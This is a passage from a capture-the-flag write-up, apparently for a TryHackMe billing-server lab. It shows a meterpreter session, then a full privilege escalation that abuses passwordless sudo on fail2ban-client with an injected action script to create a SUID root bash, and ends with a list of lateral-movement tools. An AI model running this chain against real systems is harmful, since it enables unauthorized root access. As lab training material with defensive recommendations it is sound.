 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 * @link http://www.phpgangsta.de/
 */

class PHPGangsta_GoogleAuthenticator
{ ...

meterpreter > download GoogleAuthenticator.php
[*] Downloading: GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
[*] Downloaded 6.53 KiB of 6.53 KiB (100.0%): GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
[*] Completed  : GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
meterpreter > ls
Listing: /var/www/html/mbilling/lib/GoogleAuthenticator
=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100700/rwx------  6685  fil   2024-02-27 14:44:28 -0500  GoogleAuthenticator.php

meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html/mbilling/lib
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  GoogleAuthenticator
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  PlacetoPay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  anet
100700/rwx------  64    fil   2024-02-27 14:44:28 -0500  composer.json
100700/rwx------  2459  fil   2024-02-27 14:44:28 -0500  composer.lock
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  gerencianet
040755/rwxr-xr-x  4096  dir   2025-04-18 13:27:23 -0400  icepay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  mercadopago
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  stripe

```

### Open shell

## 🔐 Post-Exploitation and Privilege Escalation Report

**Session Gained:**

Access was initially obtained via a `meterpreter` shell. A secondary interactive shell was spawned:

```bash
meterpreter > shell
Process 2078 created.
Channel 2 created.

```

**User Enumeration:**

```bash
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)

```

The shell was running as the unprivileged user `asterisk`.

---

## 🔍 Directory Inspection and Application Context

The compromised system appears to host a billing application:

```bash
cd /var/www/html/mbilling/lib
ls
GoogleAuthenticator  PlacetoPay  anet  composer.json  composer.lock
gerencianet          icepay      mercadopago         stripe

```

Numerous payment gateway modules (e.g., Stripe, MercadoPago) were present, indicating the application handles sensitive transactions.

---

## 🔒 Exploration of `fail2ban` Misconfiguration

User `asterisk` had the ability to execute `fail2ban-client` with **sudo and no password**, as verified:

```bash
sudo -l
User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

---

## ⚙️ Exploit Strategy: Abusing `fail2ban-client` Custom Action

The `/etc/fail2ban/` directory was copied to `/tmp/fail2ban` using `rsync`:

```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/

```

A malicious script was created:

```bash
cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script

```

A custom fail2ban action was injected:

```
# /tmp/fail2ban/action.d/custom-start-command.conf
[Definition]
actionstart = /tmp/script

```

A jail was configured to trigger the malicious action:

```
# /tmp/fail2ban/jail.local
[my-custom-jail]
enabled = true
action = custom-start-command

```

A minimal filter definition was added:

```
# /tmp/fail2ban/filter.d/my-custom-jail.conf
[Definition]

```

The service was restarted using `sudo`:

```bash
sudo fail2ban-client -c /tmp/fail2ban/ -v restart

```

Fail2ban started successfully and executed the `actionstart`, giving us a **SUID-root bash binary**:

```bash
/tmp/bash -p

```

This resulted in a **privilege escalation** to **root**.

---

## ✅ Post-Exploitation Outcome

A root shell was achieved via the injected SUID bash binary. From here, persistence, data exfiltration, or lateral movement could be carried out depending on the engagement's scope.

---

## ⚠️ Security Recommendations

- **Restrict sudo access:** Avoid granting `NOPASSWD` privileges to untrusted users.
- **Isolate service users:** The `asterisk` user should not have access to administrative tools like `fail2ban-client`.
- **Audit configuration directories:** Monitor changes to `/etc/fail2ban`, especially custom action definitions.
- **Use AppArmor/SELinux:** Restrict execution permissions for interpreters in non-standard paths.

---

Let me know if you want this saved as a PDF report or formatted for CTF writeup.

### I am in root

```jsx
id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) groups=1001(asterisk)
cd /root
ls
filename
passwordMysql.log
root.txt
cat root.txt
THM{33ad5b530e******f424ec23fae60}

[*] 10.10.201.100 - Meterpreter session 1 closed.  Reason: Died
^C
Terminate channel 91? [y/N]  ^[[B^[[B^[[B^[[B^[[B^[[B
                  
```

## Lateral Movement

### **Windows Lateral Movement Tools & Techniques**

1. [**Impacket**](https://github.com/fortra/impacket) – Python collection of tools for remote execution, pass-the-hash, WMI, SMB, etc.
    - Tools include: `wmiexec.py`, `psexec.py`, `smbexec.py`, `atexec.py`
2. [**PsExec**](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) – Microsoft's Sysinternals tool to execute processes remotely.
3. [**CrackMapExec**](https://github.com/Porchetta-Industries/CrackMapExec) – Swiss army knife for network pentesting; supports SMB, WinRM, RDP, etc.
4. [**WinRM / Evil-WinRM**](https://github.com/Hackplayers/evil-winrm) – Ruby tool for remote shell access over Windows Remote Management.
5. **[WMI (Windows Management Instrumentation)]** – Allows remote command execution using built-in Windows features (`wmic` or scripts).
6. **[RDP (Remote Desktop Protocol)]** – Often used post-authentication with credentials or tokens.
7. [**Token Impersonation & Pass-the-Token**](https://github.com/SkelSec/PyWhisker) – Move laterally without re-authentication using stolen tokens.
8. [**Mimikatz**](https://github.com/gentilkiwi/mimikatz) – Extracts credentials and enables pass-the-hash/ticket capabilities.

---

### 🐧 **Linux Lateral Movement Tools & Techniques**

1. **[SSH (with harvested keys/passwords)]** – Most common method for lateral movement in Unix-like systems.
2. [**SSH Agent Hijacking**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ssh-agent-hijacking) – Abuse SSH agent sockets for key reuse.
3. [**Fabric / Paramiko (Python)**](https://github.com/paramiko/paramiko) – Python libraries to automate SSH lateral movement.
4. [**Ansible Misuse**](https://book.hacktricks.xyz/pentesting-web/ansible) – Misconfigured automation can lead to lateral code execution.
5. **[scp/rsync with authorized_keys planting]** – Transfer payloads or enable backdoor access on other systems.

---

### 🧠 **General Techniques**

- **Pass-the-Hash / Pass-the-Ticket (PtH / PtT)** – Use hashed or ticket-based credentials to authenticate without knowing passwords.
- **Kerberoasting** – Extract and crack service tickets to impersonate accounts.
- **Remote Service Creation** – Create and execute services on remote machines (via `sc`, `schtasks`, or similar tools).
- **DLL Injection & WMI Scripts** – Inject malicious DLLs into remote processes or run WMI event consumers.

---

### 🔧 **Automation / Toolkits**

- [**BloodHound**](https://github.com/BloodHoundAD/BloodHound) – Maps out Active Directory attack paths.
- [**SharpHound**](https://github.com/BloodHoundAD/SharpHound) – Data collector for BloodHound (used for lateral movement path discovery).
- [**LaZagne**](https://github.com/AlessandroZ/LaZagne) – Credential dumper that helps fuel lateral moves.

---

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
